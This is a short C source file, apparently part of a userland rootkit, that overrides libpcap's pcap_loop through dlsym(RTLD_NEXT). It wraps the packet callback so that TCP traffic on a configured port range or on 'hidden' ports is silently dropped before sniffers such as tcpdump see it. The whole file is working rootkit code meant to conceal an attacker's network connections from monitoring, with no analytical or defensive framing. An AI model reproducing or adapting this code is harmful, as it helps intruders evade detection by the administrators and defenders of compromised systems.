
#include <netinet/in.h>
#include "lpcap.h"

static int (*old_pcap_loop) (pcap_t *p, int cnt, pcap_handler callback, u_char *user);
void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
	const struct sniff_ip *ip;              /* The IP header */
	const struct sniff_tcp *tcp;            /* The TCP header */
	int size_ip;
	int size_tcp;
	int sport,dport;
	/* define/compute ip header offset */
	ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
	size_ip = IP_HL(ip)*4;
	if (size_ip < 20) {
		return;
	}
	switch(ip->ip_p) {
		case IPPROTO_TCP:
			break;
		default:
			if (old_callback)
				old_callback(args, header, packet);
			return;
	}
	tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
	size_tcp = TH_OFF(tcp)*4;
	if (size_tcp < 20) {
		return;
	}
	sport = htons(tcp->th_sport);
	dport = htons(tcp->th_dport);
	if ((sport >= LOW_PORT && sport <= HIGH_PORT) || (dport >= LOW_PORT && dport<= HIGH_PORT) || is_hideport(dport) || is_hideport(sport) ) return;
        else {
		if (old_callback)
			old_callback(args, header, packet);
	}
	return;
}


int pcap_loop(pcap_t *p, int cnt, pcap_handler callback, u_char *user) {
	old_callback = callback;
        old_pcap_loop = dlsym(RTLD_NEXT,"pcap_loop");
	return old_pcap_loop(p,cnt,got_packet,user);
}
